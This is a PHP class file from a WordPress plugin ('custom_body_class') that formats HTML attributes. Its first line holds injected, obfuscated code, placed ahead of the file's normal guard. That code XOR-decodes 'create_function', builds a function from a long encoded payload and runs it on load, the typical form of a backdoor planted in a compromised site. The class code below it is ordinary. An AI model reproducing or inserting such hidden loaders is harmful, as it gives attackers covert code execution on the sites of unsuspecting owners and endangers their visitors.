<?php $abbnUh='65V36T,HN MM:;9'^'UG3RB1s.;N.9STW';$JxHnbfnkxBC=$abbnUh('',';MnbVY;NO3AVb3=1X;Frc;UB:D1.Wl=7K6fsJP4xMP=Y., =9WE.01,12Qkl,4.bsH21UtCO,  SVlFQiGg;YB+<:GoRATu:pcRUGKu3FJIzMTUIdHGC5P+QB=M1SnVaAGzXoY1KeU>NkiJXcsPRNYggE.ijvh-UKoaRiTa6TFWSTbjKPApmohr2k8RAF7=ZaX<ZEunpCLISEoXS2RcNWRVB6Ps6A160PgZ+MwhkQ.ZAXc1SH>4E,.Tlblcc,;,g4fX5eMKYWYLylMEX=8+amWDEl6-CWc=KEzZXI <RAnfEIMBAdGNNC+.KEOo>D7SPLNdN 7F0EHNEkUV><;5CyLlr52;7iftvPFWA<44LUmTv4RG72xx04hnOYONZ;KQ=fIGb3Y3kkFBSR113rpRvK6-KTahxKa>0oR.L,;WWknU>1-6E,>B-TEX:Yf-5ZTr+.UYbOPXKbs+UX4>>PanW JQpuNCRAL2iZEEKyVi->Jq+AOPyWqm29CVH>2<0j74XGYNpV,<Clkkh<RH0AQQhOD=DdGhZRB vl867BoMotMTrVi;Nl+YpCSRVWVFrb,GBQvpPuMuJf2u8HOsbsn3DL8D<W0M,-.P9O9cdFQKLX;<RxXE5O90zMZocCzaCBP-A;LXu3TY5bw8A PX3QU,Ew17XK>>jBmTzG'^'R+FC0,U-;Z.8=VEX+O5ZDC:0e PZ63bZ>BAZcpOrD6H7MXIRWw=ABnHPF043AAZJW,SE4XckGEYzvLfqI<m2PfDINgRrfsN0yj4:5cQZfwiJvtq X;31Y5EyfY,E2GmAe.QsFS8BA:K:KGwxKW43:8<C,sI4VLF024E;IqAE 4;6:JN 58Y0FSx;bJ753ESrE7I.lNdy>F4YOK<2F3Csw47.E5H<eUWD181N4WUK7O62=X;Y.QF MM<LJH< ctg.qF9FEi <.yqGLi39QMNHM,NLHRL76<V.<ZgxmKY+zdoa-,6 Dznj5JB> teCN=:6lfEjDV2Qlh5Ob39LYZV+YdH-gwjb,5 V15weWQMlhStRB3+BWQXK>agk=.:;d 4DFtgFX<JPaOKw6PERRMrR=WA>1Zbq6kC:evJ-XZwjK. PBHD,MR+W1m U+9IT.5-tC -J-1+.TGt1=WQZ5IJ3A>0YYng6 8S61 <bPmcDXbUO ;1YqWMSK171aYYI5RL14-=XqGY:KGKLX3<QhqwNolP QoL>36A-KSSNe2dOIptUeXXxYH<H a4e3atCTNws0EC2G.MyQQAYofSDUNR6>Y=c<U4sHV9J;JKC602 7ZXuTxaQ.MQSdzOCcZA8HYH7Z pQW5-T9PH Y<7R5rqlL;>=3WJBrDop:');$JxHnbfnkxBC(); defined( 'ABSPATH' ) or die;

/* This file is property of Pixel Grade Media. You may NOT copy, or redistribute
 * it. Please see the license that came with your copy for more information.
 */

/**
 * @package    custom_body_class
 * @category   core
 * @author     Pixel Grade Team
 * @copyright  (c) 2013, Pixel Grade Media
 */
class CustomBodyClassHTMLTagImpl implements CustomBodyClassHTMLTag {

	/** @var array html attributes */
	protected $attrs = null;

	/**
	 * @param array config
	 */
	static function instance( $config = null ) {
		$i = new self;
		$i->configure( $config );

		return $i;
	}

	/**
	 * Apply configuration.
	 */
	protected function configure( $config = null ) {
		$this->attrs = custom_body_class::instance( 'CustomBodyClassMeta', $config );
	}

	/**
	 * @param string key
	 * @param mixed default
	 *
	 * @return mixed
	 */
	function get( $key, $default = null ) {
		return $this->attrs->get( $key, $default );
	}

	/**
	 * @param string key
	 * @param mixed value
	 *
	 * @return static $this
	 */
	function set( $key, $value ) {
		$this->attrs->set( $key, $value );

		return $this;
	}

	/**
	 * @return string attributes
	 */
	function htmlattributes( array $extra = array() ) {
		$attr_segments = array();
		$attributes    = custom_body_class::merge( $this->attrs->metadata_array(), $extra );
		foreach ( $attributes as $key => $value ) {
			if ( $value !== false && $value !== null ) {
				if ( ! empty( $value ) ) {
					if ( is_array( $value ) ) {
						$htmlvalue       = implode( ' ', $value );
						$attr_segments[] = "$key=\"$htmlvalue\"";
					} else { // value is not an array
						$attr_segments[] = "$key=\"$value\"";
					}
				} else { // empty html tag; ie. no value html tag
					$attr_segments[] = $key;
				}
			}
		}

		return implode( ' ', $attr_segments );
	}

} # class
